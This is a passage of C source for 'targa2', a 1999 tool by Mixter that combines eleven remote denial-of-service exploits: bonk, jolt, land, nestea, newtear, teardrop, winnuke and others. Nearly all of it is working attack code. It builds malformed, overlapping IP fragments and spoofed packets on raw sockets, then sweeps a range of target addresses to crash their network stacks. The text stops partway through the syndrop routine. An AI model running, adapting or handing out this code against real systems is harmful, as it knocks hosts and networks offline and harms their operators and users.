/* targa2.c - copyright by Mixter <mixter@popmail.com>
   version 2.1 - released 22/3/99 - interface to 11
   multi-platform remote denial of service exploits

   gcc -Wall -O2 targa2.c -o targa2 ; strip targa2 */

/*
 *        featured exploits / authors / vulnerable platforms
 * bonk by route|daemon9 & klepto              - win95, nameservers
 * jolt by Jeff W. Roberson (overdrop: Mixter) - win95, klog (old linux)
 * land by m3lt                                - win95/nt, old un*x's
 * nestea by humble & ttol                     - older linux/bsd?
 * newtear by route|daemon9                    - linux/bsd/win95/others
 * syndrop by PineKoan                         - linux/win95/?
 * teardrop by route|daemon9                   - lots of os's
 * winnuke by _eci                             - win95/win31
 * 1234 by DarkShadow/Flu                      - win95/98/nt/others?
 * saihyousen by noc-wage                      - win98/firewalls/routers
 * oshare by r00t zer0                         - win9x/NT/macintosh
 */

/* http://members.xoom.com/i0wnu - code copyright by Mixter */

/* these are user definable */
#define LANDPORT 113		/* remote port for land's */
#define WNUKEPORT 139		/* port for winnukes */

#define LANDREP     15		/* repeat land attack x times */
#define JOLTREP     15		/* repeat jolt attack x times */
#define BONKREP     15		/* repeat bonk attack x times */
#define WNUKEREP     0		/* repeat winnuke x times */
#define COUNT       15		/* repeat frag attacks x times */
#define NESCOUNT    15		/* repeat nestea attack x times */
#define X1234COUNT  50		/* repeat 1234 attack x times */
#define SAICOUNT    50		/* repeat saihyousen attack x times */
#define OSHCOUNT    50		/* repeat oshare attack x times */

#define __FAVOR_BSD		/* for newer linux */
#define TH_SYN 0x02		/* for lame includes */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#define FIX(n)  htons(n)	/* define this to (n), if using BSD */
#define IPH     0x14		/* IP header size */
#define UDPH    0x8		/* UDP header size */
#define IP_MF   0x2000		/* Fragmention offset */
#define MAGIC   0x3		/* Teardrop Magic fragmentation constant (tm) */
#define MAGIC2  108		/* Nestea Magic fragmentation constant (tm) */
#define NESPADDING 256		/* Padding for Nestea */
#define PADDING 0x14		/* Padding for other frag's */
#define TCPH    sizeof(struct tcphdr)	/* TCP header size (nestea) */
#define TPADDING 0x1c		/* Padding for original teardrop */

/* main() - user interface & some functions */

struct ipstuph
  {
    int p1;
    int p2;
    int p3;
    int p4;
  }
startip, endip;

void targa (u_char *);
u_long leet_resolve (u_char *);
u_short in_cksum (u_short *, int);
int hax0r (char *, int);
int targa_help (u_char *);
int bonk (char *);
int jolt (char *);
int land (char *);
int nestea (char *);
int newtear (char *);
int syndrop (char *);
int teardrop (char *);
int winnuke (char *, int);
int x1234 (char *);
int saihyousen (char *);
int oshare (char *);


int
main (int argc, char **argv)
{
  int count = 1, i, j, dostype = 0;
  char hit_ip[18], dst_ip2[18], dst_ip[4096];

  fprintf (stderr, "\t\t[1;33mtarga 2.1 by [0;34m[5mMixter[0m\n");
  if ((argv[1] == "-help") || (argv[1] == "--help") || (argv[1] == "-h") || (argv[1] == "--h"))
    targa_help (argv[0]);
  if (argc < 3)
    if (argc < 2)
      targa (argv[0]);
  strncpy (dst_ip, argv[1], 4096);
  if (argc == 2)
    {
      strncpy (dst_ip2, argv[1], 18);
    }
  else
    {
      strncpy (dst_ip2, argv[2], 18);
    }
  if (sscanf (dst_ip, "%d.%d.%d.%d", &startip.p1, &startip.p2, &startip.p3, &startip.p4) != 4)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Error, %s: Please use a start IP containing 4 zones\n", argv[1]);
      exit (1);
    }
  if (startip.p1 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 1 of start ip is incorrect (greater than 255)\n");
      exit (1);
    }
  if (startip.p2 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 2 of start ip is incorrect (greater than 255)\n");
      exit (1);
    }
  if (startip.p3 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 3 of start ip is incorrect (greater than 255)\n");
      exit (1);
    }
  if (startip.p4 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 4 of start ip is incorret (greater than 255)\n");
      exit (1);
    }
  if (sscanf (dst_ip2, "%d.%d.%d.%d", &endip.p1, &endip.p2, &endip.p3, &endip.p4) != 4)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Error, %s: Please use an end IP containing 4 zones\n", argv[2]);
      exit (1);
    }
  if (endip.p1 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 1 of end ip is incorrect (greater than 255)\n");
      exit (1);
    }
  if (endip.p2 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 2 of end ip is incorrect (greater than 255)\n");
      exit (1);
    }
  if (endip.p3 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 3 of end ip is incorrect (greater than 255)\n");
      exit (1);
    }
  if (endip.p4 > 255)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 4 of end ip is incorrect (greater than 255)\n");
      exit (1);
    }
  if (startip.p1 != endip.p1)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 1 of start ip and end ip is different[0m\n");
      exit (1);
    }
  if (startip.p2 != endip.p2)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 2 of start ip and end ip is different\n");
      exit (1);
    }
  if (startip.p3 != endip.p3)
    {
      targa_help (argv[0]);
      fprintf (stderr, "Zone 3 of start ip and end ip is different\n");
      exit (1);
    }
  while ((i = getopt (argc, argv, "t:n:h")) != EOF)
    {
      switch (i)
	{
	case 't':
	  dostype = atoi (optarg);	/* type of DOS */
	  break;
	case 'n':		/* number to send */
	  count = atoi (optarg);
	  break;
	case 'h':		/* quiet mode */
	  targa_help (argv[0]);
	  break;
	default:
	  targa (argv[0]);
	  break;		/* NOTREACHED */
	}
    }
  srandom ((unsigned) (time ((time_t) 0)));
  srand (time (NULL));
  fprintf (stderr, "[1;31mLeet[0;31mness on f[1;31mlaxen wing[0;31ms[0m:\n");
  fprintf (stderr, "[1;31mTo[0m: [0;31m%s - %s[0m\n", dst_ip, dst_ip2);
  fprintf (stderr, "[1;31mRepeats[0m: [0;31m%5d[0m\n", count);
  fprintf (stderr, "[1;31m   Type[0m: [0;31m%5d[0m\n", dostype);

  for (j = startip.p4; j <= endip.p4; j++)
    {
      sprintf (hit_ip, "%d.%d.%d.%d", startip.p1, startip.p2, startip.p3, j);
      fprintf (stderr, "[0;31m%s [1;31m[ [0m", hit_ip);
      for (i = 0; i < count; i++)
	{
	  hax0r (hit_ip, dostype);
	  usleep (10);
	}
      fprintf (stderr, "[0;31m ][0m\n");
    }
  fprintf (stderr, "\t[5m[1;31m-all done-[0m\n");
  return (0);
}
int
hax0r (char *vm, int te)
{
  int counter;
/* beginning of hardcoded ereetness :P */
  if (te == 1 || te == 0)
    bonk (vm);
  if (te == 2 || te == 0)
    jolt (vm);
  if (te == 3 || te == 0)
    land (vm);
  if (te == 4 || te == 0)
    nestea (vm);
  if (te == 5 || te == 0)
    newtear (vm);
  if (te == 6 || te == 0)
    syndrop (vm);
  if (te == 7 || te == 0)
    teardrop (vm);
  if (te == 8 || te == 0)
    {
      if ((!WNUKEREP) && (te == 8))
	winnuke (vm, 10);
      winnuke (vm, WNUKEREP);
    }
  if (te == 9 || te == 0)
    {
      for (counter = 0; counter <= X1234COUNT; counter++)
	x1234 (vm);
    }
  if (te == 10 || te == 0)
    {
      for (counter = 0; counter <= SAICOUNT; counter++)
	saihyousen (vm);
    }
  if (te == 11 || te == 0)
    {
      for (counter = 0; counter <= OSHCOUNT; counter++)
	oshare (vm);
    }
  return (31337);
}
u_long
leet_resolve (u_char * host_name)
{
  struct in_addr addr;
  struct hostent *host_ent;

  if ((addr.s_addr = inet_addr (host_name)) == -1)
    {
      if (!(host_ent = gethostbyname (host_name)))
	return (0);
      bcopy (host_ent->h_addr, (char *) &addr.s_addr, host_ent->h_length);
    }
  return (addr.s_addr);
}
void
targa (u_char * name)
{
  fprintf (stderr, "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats][0m\n", name);
  exit (0);
}
int
targa_help (u_char * name)
{
  fprintf (stderr, "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]\n", name);
  fprintf (stderr, "startIP - endIP: [1;31mIP range to send packets to (destination)\n");
  fprintf (stderr, "[0;31mstart and end must be on the same C class (1.1.1.X)\n");
  fprintf (stderr, "repeats: [1;31mrepeat the whole cycle n times (default is 1)\n");
  fprintf (stderr, "[0;31mtype: [1;31mkind of remote DoS to send (default is 0)\n");
  fprintf (stderr, "[0;31m1 = bonk ([1;31m$[0m[0;31m)  2 = jolt ([1;32m@[0m[0;31m)  3 = land ([1;33m-[0m[0;31m)\n");
  fprintf (stderr, "4 = nestea ([1;34m.[0m[0;31m)  5 = newtear ([1;32m#[0m[0;31m)\n");
  fprintf (stderr, "6 = syndrop ([1;35m&[0m[0;31m)  7 = teardrop ([1;34m%%[0m[0;31m)  8 = winnuke ([1;37m*[0m[0;31m)\n");
  fprintf (stderr, "9 = 1234 ([1;38m![0m[0;31m)  10 = saihyousen ([1;36m+[0m[0;31m)  11 = oshare ([0;33m|[0m[0;31m)\n");
  fprintf (stderr, "[0;31m0 = use all remote DoS types at once\n[0m");
  exit (0);
}

u_short
in_cksum (u_short * addr, int len)
{
  int nleft = len, sum = 0;
  u_short *w = addr, answer = 0;
  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

/* bonk(destination) */

struct udp_pkt
{
  struct iphdr ip;
  struct udphdr udp;
  char data[0x1c];
}
pkt;

int udplen = sizeof (struct udphdr), iplen = sizeof (struct iphdr), datalen = 100,
  psize = sizeof (struct udphdr) + sizeof (struct iphdr) + 0x1c, spf_sck;	/* Socket */

u_long
host_to_ip (char *host_name)
{
  static u_long ip_bytes;
  struct hostent *res;
  res = gethostbyname (host_name);
  if (res == NULL)
    return (0);
  memcpy (&ip_bytes, res->h_addr, res->h_length);
  return (ip_bytes);
}

void
quit (char *reason)
{
  perror (reason);
  close (spf_sck);
  exit (-1);
}

int
fondle (int sck, u_long src_addr, u_long dst_addr, int src_prt,
	int dst_prt)
{
  int bs;
  struct sockaddr_in to;

  memset (&pkt, 0, psize);
  /* Fill in ip header */
  pkt.ip.version = 4;
  pkt.ip.ihl = 5;
  pkt.ip.tot_len = htons (udplen + iplen + 0x1c);
  pkt.ip.id = htons (0x455);
  pkt.ip.ttl = 255;
  pkt.ip.protocol = IPPROTO_UDP;
  pkt.ip.saddr = src_addr;
  pkt.ip.daddr = dst_addr;
  pkt.ip.frag_off = htons (0x2000);	/* more to come */

  pkt.udp.source = htons (src_prt);	/* udp header */
  pkt.udp.dest = htons (dst_prt);
  pkt.udp.len = htons (8 + 0x1c);
  /* send 1st frag */

  to.sin_family = AF_INET;
  to.sin_port = src_prt;
  to.sin_addr.s_addr = dst_addr;

  bs = sendto (sck, &pkt, psize, 0, (struct sockaddr *) &to,
	       sizeof (struct sockaddr));

  pkt.ip.frag_off = htons (0x3 + 1);	/* shinanigan */
  pkt.ip.tot_len = htons (iplen + 0x3);
  /* 2nd frag */

  bs = sendto (sck, &pkt, iplen + 0x3 + 1, 0,
	       (struct sockaddr *) &to, sizeof (struct sockaddr));

  return bs;
}

int
bonk (char *bonk_host)
{
  int i, src_prt = 53, dst_prt = 53, bs = 1, pkt_count = BONKREP;
  u_long dst_addr = host_to_ip (bonk_host);
  if (!dst_addr)
    quit ("bad target host");
  spf_sck = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (!spf_sck)
    quit ("socket()");
  if (setsockopt (spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,
		  sizeof (bs)) < 0)
    quit ("IP_HDRINCL");
  for (i = 0; i < pkt_count; ++i)
    {
      fondle (spf_sck, rand (), dst_addr, src_prt, dst_prt);
      fprintf (stderr, "[1;31m$[0m");
      usleep (1000);
    }
  close (spf_sck);
  return 0;
}

/* jolt(destination) */

int
jolt (char *jolt_host)
{
  int s, i;
  char buf[400];
  struct ip *ip = (struct ip *) buf;
  struct icmphdr *icmp = (struct icmphdr *) (ip + 1);
  struct hostent *hp;
  struct sockaddr_in dst;
  int offset, on = 1, num = JOLTREP;

  bzero (buf, sizeof buf);

  if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror ("socket");
      exit (1);
    }
  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0)
    {
      perror ("IP_HDRINCL");
      exit (1);
    }
  for (i = 1; i <= num; i++)
    {

      if ((hp = gethostbyname (jolt_host)) == NULL)
	{
	  if ((ip->ip_dst.s_addr = inet_addr (jolt_host)) == -1)
	    {
	      fprintf (stderr, "%s: unknown host\n", jolt_host);
	      exit (1);
	    }
	}
      else
	{
	  bcopy (hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
	}

      ip->ip_src.s_addr = rand ();
      fprintf (stderr, "[1;32m@[0m");
      inet_ntoa (ip->ip_dst);
      ip->ip_v = 4;
      ip->ip_hl = sizeof *ip >> 2;
      ip->ip_tos = 0;
      ip->ip_len = htons (sizeof buf);
      ip->ip_id = htons (4321);
      ip->ip_off = htons (0);
      ip->ip_ttl = 255;
      ip->ip_p = 1;

      dst.sin_addr = ip->ip_dst;
      dst.sin_family = AF_INET;

      icmp->type = ICMP_ECHO;
      icmp->code = 0;
      icmp->checksum = htons (~(ICMP_ECHO << 8));
      for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip))
	{
	  ip->ip_off = htons (offset >> 3);
	  if (offset < 65120)
	    ip->ip_off |= htons (0x2000);
	  else
	    ip->ip_len = htons (418);	/* make total 65538 */
	  if (sendto (s, buf, sizeof buf, 0, (struct sockaddr *) &dst,
		      sizeof dst) < 0)
	    {
	      fprintf (stderr, "offset %d: ", offset);
	      perror ("sendto");
	    }
	  if (offset == 0)
	    {
	      icmp->type = 0;
	      icmp->code = 0;
	      icmp->checksum = 0;
	    }
	}
    }
  close (s);
  return 0;
}

/* land(destination,port) */

typedef u_long tcp_seq;
struct tcxhdr
  {
    u_short th_sport;
    u_short th_dport;
    tcp_seq th_seq;
    tcp_seq th_ack;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u_char th_x2:4, th_off:4;
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
    u_char th_off:4, th_x2:4;
#endif
    u_char th_flags;
    u_short th_win;
    u_short th_sum;
    u_short th_urp;
  };

struct pseudohdr
  {
    struct in_addr saddr;
    struct in_addr daddr;
    u_char zero;
    u_char protocol;
    u_short length;
    struct tcxhdr tcpheader;
  };

u_short
checksum (u_short * data, u_short length)
{
  register long value = 0;
  u_short i;

  for (i = 0; i < (length >> 1); i++)
    value += data[i];

  if ((length & 1) == 1)
    value += (data[i] << 8);

  value = (value & 65535) + (value >> 16);

  return (~value);
}

int
land (char *land_host)
{
  struct sockaddr_in sin;
  struct hostent *hoste;
  int sock, i;
  char buffer[40];
  struct iphdr *ipheader = (struct iphdr *) buffer;
  struct tcxhdr *tcpheader = (struct tcxhdr *) (buffer + sizeof (struct iphdr));
  struct pseudohdr pseudoheader;
  static int land_port = LANDPORT;
  bzero (&sin, sizeof (struct sockaddr_in));
  sin.sin_family = AF_INET;

  if ((hoste = gethostbyname (land_host)) != NULL)
    bcopy (hoste->h_addr, &sin.sin_addr, hoste->h_length);
  else if ((sin.sin_addr.s_addr = inet_addr (land_host)) == -1)
    {
      fprintf (stderr, "unknown host %s\n", land_host);
      return (-1);
    }

  if ((sin.sin_port = htons (land_port)) == 0)
    return (-1);
  if ((sock = socket (AF_INET, SOCK_RAW, 255)) == -1)
    return (-1);

  bzero (&buffer, sizeof (struct iphdr) + sizeof (struct tcxhdr));
  ipheader->version = 4;
  ipheader->ihl = sizeof (struct iphdr) / 4;
  ipheader->tot_len = htons (sizeof (struct iphdr) + sizeof (struct tcxhdr));
  ipheader->id = htons (0xF1C);
  ipheader->ttl = 255;
  ipheader->protocol = IPPROTO_TCP;
  ipheader->saddr = sin.sin_addr.s_addr;
  ipheader->daddr = sin.sin_addr.s_addr;

  tcpheader->th_sport = sin.sin_port;
  tcpheader->th_dport = sin.sin_port;
  tcpheader->th_seq = htonl (0xF1C);
  tcpheader->th_flags = TH_SYN;
  tcpheader->th_off = sizeof (struct tcxhdr) / 4;
  tcpheader->th_win = htons (2048);

  bzero (&pseudoheader, 12 + sizeof (struct tcxhdr));
  pseudoheader.saddr.s_addr = sin.sin_addr.s_addr;
  pseudoheader.daddr.s_addr = sin.sin_addr.s_addr;
  pseudoheader.protocol = 6;
  pseudoheader.length = htons (sizeof (struct tcxhdr));
  bcopy ((char *) tcpheader, (char *) &pseudoheader.tcpheader, sizeof (struct tcxhdr));
  tcpheader->th_sum = checksum ((u_short *) & pseudoheader, 12 + sizeof (struct tcxhdr));
  for (i = 0; i < LANDREP; i++)
    {
      if (sendto (sock, buffer, sizeof (struct iphdr) + sizeof (struct tcxhdr), 0, (struct sockaddr *) &sin, sizeof (struct sockaddr_in)) == -1)
	{
	  fprintf (stderr, "couldn't send packet\n");
	  return (-1);
	}
      fprintf (stderr, "[1;33m-[0m");
    }
  close (sock);
  return (0);
}

/* nestea(source, destination) */

u_long name_resolve (u_char *);
void send_nes (int, u_long, u_long, u_short, u_short);

int
nestea (char *nes_host)
{
  int one = 1, count = 0, i, rip_sock;
  u_long src_ip = 0, dst_ip = 0;
  u_short src_prt = 0, dst_prt = 0;
  struct in_addr addr;

  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror ("raw socket");
      exit (1);
    }
  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))
      < 0)
    {
      perror ("IP_HDRINCL");
      exit (1);
    }
  if (!(dst_ip = name_resolve (nes_host)))
    {
      fprintf (stderr, "What the hell kind of IP address is that?\n");
      exit (1);
    }
  src_ip = rand ();
  srandom ((unsigned) (time ((time_t) 0)));
  src_prt = (random () % 0xffff);
  dst_prt = (random () % 0xffff);
  count = NESCOUNT;

  addr.s_addr = src_ip;
  addr.s_addr = dst_ip;
  for (i = 0; i < count; i++)
    {
      send_nes (rip_sock, src_ip, dst_ip, src_prt, dst_prt);
      fprintf (stderr, "[1;34m.[0m");
      usleep (500);
    }
  close (rip_sock);
  return (0);
}

void
send_nes (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
	  u_short dst_prt)
{
  int i;
  u_char *packet = NULL, *p_ptr = NULL;		/* packet pointers */
  u_char byte;			/* a byte */
  struct sockaddr_in sin;	/* socket protocol structure */

  sin.sin_family = AF_INET;
  sin.sin_port = src_prt;
  sin.sin_addr.s_addr = dst_ip;

  packet = (u_char *) malloc (IPH + UDPH + NESPADDING + 40);
  p_ptr = packet;
  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING);

  byte = 0x45;			/* IP version and header length */
  memcpy (p_ptr, &byte, sizeof (u_char));
  p_ptr += 2;			/* IP TOS (skipped) */
  *((u_short *) p_ptr) = FIX (IPH + UDPH + 10);		/* total length */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (242);	/* IP id */
  p_ptr += 2;
  *((u_short *) p_ptr) |= FIX (IP_MF);	/* IP frag flags and offset */
  p_ptr += 2;
  *((u_short *) p_ptr) = 0x40;	/* IP TTL */
  byte = IPPROTO_UDP;
  memcpy (p_ptr + 1, &byte, sizeof (u_char));
  p_ptr += 4;			/* IP checksum filled in by kernel */
  *((u_long *) p_ptr) = src_ip;	/* IP source address */
  p_ptr += 4;
  *((u_long *) p_ptr) = dst_ip;	/* IP destination address */
  p_ptr += 4;
  *((u_short *) p_ptr) = htons (src_prt);	/* UDP source port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (dst_prt);	/* UDP destination port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (8 + 10);	/* UDP total length */

  if (sendto (sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }

  p_ptr = packet;
  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING);

  byte = 0x45;			/* IP version and header length */
  memcpy (p_ptr, &byte, sizeof (u_char));
  p_ptr += 2;			/* IP TOS (skipped) */
  *((u_short *) p_ptr) = FIX (IPH + UDPH + MAGIC2);	/* total length */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (242);	/* IP id */
  p_ptr += 2;
  *((u_short *) p_ptr) = FIX (6);	/* IP frag flags and offset */
  p_ptr += 2;
  *((u_short *) p_ptr) = 0x40;	/* IP TTL */
  byte = IPPROTO_UDP;
  memcpy (p_ptr + 1, &byte, sizeof (u_char));
  p_ptr += 4;			/* IP checksum filled in by kernel */
  *((u_long *) p_ptr) = src_ip;	/* IP source address */
  p_ptr += 4;
  *((u_long *) p_ptr) = dst_ip;	/* IP destination address */
  p_ptr += 4;
  *((u_short *) p_ptr) = htons (src_prt);	/* UDP source port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (dst_prt);	/* UDP destination port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (8 + MAGIC2);	/* UDP total length */

  if (sendto (sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }

  p_ptr = packet;
  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING + 40);
  byte = 0x4F;			/* IP version and header length */
  memcpy (p_ptr, &byte, sizeof (u_char));
  p_ptr += 2;			/* IP TOS (skipped) */
  *((u_short *) p_ptr) = FIX (IPH + UDPH + NESPADDING + 40);
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (242);	/* IP id */
  p_ptr += 2;
  *((u_short *) p_ptr) = 0 | FIX (IP_MF);	/* IP frag flags and offset */
  p_ptr += 2;
  *((u_short *) p_ptr) = 0x40;	/* IP TTL */
  byte = IPPROTO_UDP;
  memcpy (p_ptr + 1, &byte, sizeof (u_char));
  p_ptr += 4;			/* IP checksum filled in by kernel */
  *((u_long *) p_ptr) = src_ip;	/* IP source address */
  p_ptr += 4;
  *((u_long *) p_ptr) = dst_ip;	/* IP destination address */
  p_ptr += 44;
  *((u_short *) p_ptr) = htons (src_prt);	/* UDP source port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (dst_prt);	/* UDP destination port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (8 + NESPADDING);	/* UDP total length */

  for (i = 0; i < NESPADDING; i++)
    {
      p_ptr[i++] = random () % 255;
    }

  if (sendto (sock, packet, IPH + UDPH + NESPADDING, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }
  free (packet);
}

u_long
name_resolve (u_char * host_name)
{
  struct in_addr addr;
  struct hostent *host_ent;

  if ((addr.s_addr = inet_addr (host_name)) == -1)
    {
      if (!(host_ent = gethostbyname (host_name)))
	return (0);
      bcopy (host_ent->h_addr, (char *) &addr.s_addr, host_ent->h_length);
    }
  return (addr.s_addr);
}

/* newtear(destination) */

void newt_frags (int, u_long, u_long, u_short, u_short);

int
newtear (char *newt_host)
{
  int one = 1, count = 0, i, rip_sock;
  u_long src_ip = 0, dst_ip = 0;
  u_short src_prt = 0, dst_prt = 0;
  struct in_addr addr;

  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror ("raw socket");
      exit (1);
    }
  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))
      < 0)
    {
      perror ("IP_HDRINCL");
      exit (1);
    }
  if (!(dst_ip = name_resolve (newt_host)))
    {
      fprintf (stderr, "What the hell kind of IP address is that?\n");
      exit (1);
    }
  src_ip = rand ();
  srandom ((unsigned) (time ((time_t) 0)));
  src_prt = (random () % 0xffff);
  dst_prt = (random () % 0xffff);
  count = COUNT;

  addr.s_addr = src_ip;
  addr.s_addr = dst_ip;

  for (i = 0; i < count; i++)
    {
      newt_frags (rip_sock, src_ip, dst_ip, src_prt, dst_prt);
      fprintf (stderr, "[1;32m#[0m");
      usleep (500);
    }
  close (rip_sock);
  return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void
newt_frags (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
	    u_short dst_prt)
{
  u_char *packet = NULL, *p_ptr = NULL;		/* packet pointers */
  u_char byte;			/* a byte */
  struct sockaddr_in sin;	/* socket protocol structure */

  sin.sin_family = AF_INET;
  sin.sin_port = src_prt;
  sin.sin_addr.s_addr = dst_ip;

  /*
   * Grab some memory for our packet, align p_ptr to point at the beginning
   * of our packet, and then fill it with zeros.
   */
  packet = (u_char *) malloc (IPH + UDPH + PADDING);
  p_ptr = packet;
  bzero ((u_char *) p_ptr, IPH + UDPH + PADDING);	// Set it all to zero

  byte = 0x45;			/* IP version and header length */
  memcpy (p_ptr, &byte, sizeof (u_char));
  p_ptr += 2;			/* IP TOS (skipped) */
  *((u_short *) p_ptr) = FIX (IPH + UDPH + PADDING);	/* total length */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (242);	/* IP id */
  p_ptr += 2;
  *((u_short *) p_ptr) |= FIX (IP_MF);	/* IP frag flags and offset */
  p_ptr += 2;
  *((u_short *) p_ptr) = 0x40;	/* IP TTL */
  byte = IPPROTO_UDP;
  memcpy (p_ptr + 1, &byte, sizeof (u_char));
  p_ptr += 4;			/* IP checksum filled in by kernel */
  *((u_long *) p_ptr) = src_ip;	/* IP source address */
  p_ptr += 4;
  *((u_long *) p_ptr) = dst_ip;	/* IP destination address */
  p_ptr += 4;
  *((u_short *) p_ptr) = htons (src_prt);	/* UDP source port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (dst_prt);	/* UDP destination port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (8 + PADDING * 2);	/* UDP total length *//* Increases UDP total length to 48 bytes
							   Which is too big! */

  if (sendto (sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }

  /*  We set the fragment offset to be inside of the previous packet's
   *  payload (it overlaps inside the previous packet) but do not include
   *  enough payload to cover complete the datagram.  Just the header will
   *  do, but to crash NT/95 machines, a bit larger of packet seems to work
   *  better.
   */
  p_ptr = &packet[2];		/* IP total length is 2 bytes into the header */
  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);
  p_ptr += 4;			/* IP offset is 6 bytes into the header */
  *((u_short *) p_ptr) = FIX (MAGIC);

  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }
  free (packet);
}

/* syndrop(destination) */

u_long name_resolve (u_char *);
void send_synd (int, u_long, u_long, u_short, u_short, u_long, u_long);

int
syndrop (char *synd_host)
{
  int one = 1, count = 0, i, rip_sock;
  u_long src_ip = 0, dst_ip = 0;
  u_short src_prt = 0, dst_prt = 0;
  u_long s_start = 0, s_end = 0;
  struct in_addr addr;
  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror ("raw socket");
      exit (1);
    }
  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one)) < 0)
    {
      perror ("IP_HDRINCL");
      exit (1);
    }
  if (!(dst_ip = name_resolve (synd_host)))
    {
      fprintf (stderr, "What the hell kind of IP address is that?\n");
      exit (1);
    }
  src_ip = rand ();
  srandom ((unsigned) (time ((time_t) 0)));
  src_prt = (random () % 0xffff);
  dst_prt = (random () % 0xffff);
  count = COUNT;

  addr.s_addr = src_ip;
  addr.s_addr = dst_ip;
  for (i = 0; i < count; i++)
    {
      send_synd (rip_sock, src_ip, dst_ip, src_prt, dst_prt, s_start, s_end);
      fprintf (stderr, "[1;35m&[0m");
      usleep (500);
    }
  close (rip_sock);
  return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void
send_synd (int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short dst_prt, u_long seq1, u_long seq2)
{
  u_char *packet = NULL, *p_ptr = NULL;		/* packet pointers */
  u_char byte;			/* a byte */
  struct sockaddr_in sin;	/* socket protocol structure */

  sin.sin_family = AF_INET;
  sin.sin_port = src_prt;
  sin.sin_addr.s_addr = dst_ip;

  /*
   * Grab some memory for our packet, align p_ptr to point at the beginning
   * of our packet, and then fill it with zeros.
   */
  packet = (u_char *) malloc (IPH + UDPH + PADDING);
  p_ptr = packet;
  bzero ((u_char *) p_ptr, IPH + UDPH + PADDING);	/* Set it all to zero */

  byte = 0x45;			/* IP version and header length */
  memcpy (p_ptr, &byte, sizeof (u_char));
  p_ptr += 2;			/* IP TOS (skipped) */
